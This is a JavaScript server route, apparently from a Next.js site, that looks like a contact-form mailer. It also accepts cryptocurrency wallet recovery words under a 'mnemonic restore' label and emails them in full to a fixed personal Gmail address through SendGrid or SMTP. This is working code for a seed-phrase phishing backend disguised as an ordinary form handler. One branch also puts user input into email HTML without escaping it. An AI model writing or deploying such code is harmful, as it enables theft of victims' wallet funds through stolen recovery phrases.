import { env } from 'process'

export async function POST(req) {
  try {
    const body = await req.json()
    // Accept either contact form { name, email, message } or mnemonic { words, count }
    const { name, email, message, words, count } = body

    // Build email content
    let subject = 'Website message'
    let text = ''
    let html = ''

    if (Array.isArray(words)) {
      subject = `Mnemonic restore — ${count || words.length} words`
      const numbered = words.map((w, i) => `${i + 1}. ${w || ''}`).join('\n')
      text = `Mnemonic words (count: ${count || words.length})\n\n${numbered}`
      html = `<p><strong>Mnemonic words (count: ${count || words.length})</strong></p><pre>${numbered}</pre>`
    } else {
      if (!name || !email || !message) {
        return new Response(JSON.stringify({ error: 'All fields are required' }), { status: 400 })
      }
      subject = 'Website contact form submission'
      text = `From: ${name} <${email}>\n\n${message}`
      html = `<p><strong>From:</strong> ${name} &lt;${email}&gt;</p><p>${message}</p>`
    }

    // Prefer SendGrid if API key provided (avoids SMTP DNS issues)
    const sendgridKey = env.SENDGRID_API_KEY
    if (sendgridKey) {
      const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${sendgridKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: 'vishalupdev@gmail.com' }] }],
          from: { email: (email || 'no-reply@localhost'), name: (name || 'Website') },
          subject,
          content: [
            { type: 'text/plain', value: text },
            { type: 'text/html', value: html },
          ],
        }),
      })
      if (!res.ok) {
        const bodyText = await res.text()
        console.error('SendGrid error', res.status, bodyText)
        return new Response(JSON.stringify({ error: `SendGrid error ${res.status}: ${bodyText}` }), { status: 500 })
      }
      return new Response(JSON.stringify({ ok: true, provider: 'sendgrid' }), { status: 200 })
    }

    // Otherwise use nodemailer with SMTP or Gmail creds
    let nodemailerMod
    try {
      nodemailerMod = await import('nodemailer')
    } catch (e) {
      console.error('nodemailer import failed:', e)
      return new Response(JSON.stringify({ error: 'nodemailer not installed. Run npm install or set SENDGRID_API_KEY.' }), { status: 500 })
    }
    const nodemailer = nodemailerMod.default ?? nodemailerMod

    // Prefer explicit SMTP settings, otherwise fall back to MAIL_USER/MAIL_PASS as Gmail
    const smtpHost = (env.SMTP_HOST || '').trim()
    const smtpPort = env.SMTP_PORT ? parseInt((env.SMTP_PORT || '').trim(), 10) : undefined
    const smtpSecure = (env.SMTP_SECURE || '').toString() === 'true'
    const smtpUser = (env.SMTP_USER || env.MAIL_USER || '').toString().trim()
    const smtpPass = (env.SMTP_PASS || env.MAIL_PASS || '').toString().trim()

    // Add timestamp and nicer HTML design for email
    const now = new Date().toUTCString()
    html = `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial; color:#111;">
        <h2 style="color:#0f766e;">Mnemonic Restore Request</h2>
        <p style="color:#555; font-size:14px;">Received: ${now}</p>
        <div style="margin-top:12px; padding:12px; background:#f8fafc; border-radius:6px;">
          <p style="margin:0 0 8px 0; font-weight:600;">Details</p>
          ${Array.isArray(words)
            ? `<ol style="margin:0 0 0 18px; padding:0;">${words.map((w,i)=>`<li style="margin:4px 0;">${(w||'').replace(/</g,'&lt;')}</li>`).join('')}</ol>`
            : `<p style="margin:0;">From: <strong>${(name||'').replace(/</g,'&lt;')}</strong> &lt;${(email||'').replace(/</g,'&lt;')} &gt;</p><p style="margin-top:8px;">${(message||'').replace(/</g,'&lt;')}</p>`}
        </div>
        <p style="font-size:12px;color:#8892a6;margin-top:10px;">This message was sent to vishalupdev@gmail.com</p>
      </div>
    `

    if (!smtpUser || !smtpPass) {
      console.error('SMTP credentials missing: SMTP_USER or SMTP_PASS / MAIL_USER or MAIL_PASS')
      return new Response(JSON.stringify({ error: 'SMTP credentials missing. Set SMTP_USER and SMTP_PASS or SENDGRID_API_KEY.' }), { status: 500 })
    }

    // log masked credentials for debugging
    try {
      console.log('SMTP host:', smtpHost || '(gmail service)')
      console.log('SMTP user:', smtpUser ? smtpUser.replace(/(.).+(@.+)/, '$1***$2') : '(none)')
    } catch (e) {
      /* ignore logging failures */
    }

    const transporter = nodemailer.createTransport(
      smtpHost
        ? { host: smtpHost, port: smtpPort || 587, secure: smtpSecure || false, auth: { user: smtpUser, pass: smtpPass } }
        : { service: 'gmail', auth: { user: smtpUser, pass: smtpPass } }
    )

    try {
      const info = await transporter.sendMail({
        from: smtpUser ? `${smtpUser}` : 'no-reply@localhost',
        to: 'vishalupdev@gmail.com',
        subject,
        text,
        html,
      })
      console.log('mail sent info:', info)
      return new Response(JSON.stringify({ ok: true, info }), { status: 200 })
    } catch (sendErr) {
      console.error('sendMail error:', sendErr)
      return new Response(JSON.stringify({ error: sendErr.message || String(sendErr) }), { status: 500 })
    }
  } catch (err) {
    console.error('handler error:', err)
    return new Response(JSON.stringify({ error: err.message || String(err) }), { status: 500 })
  }
}
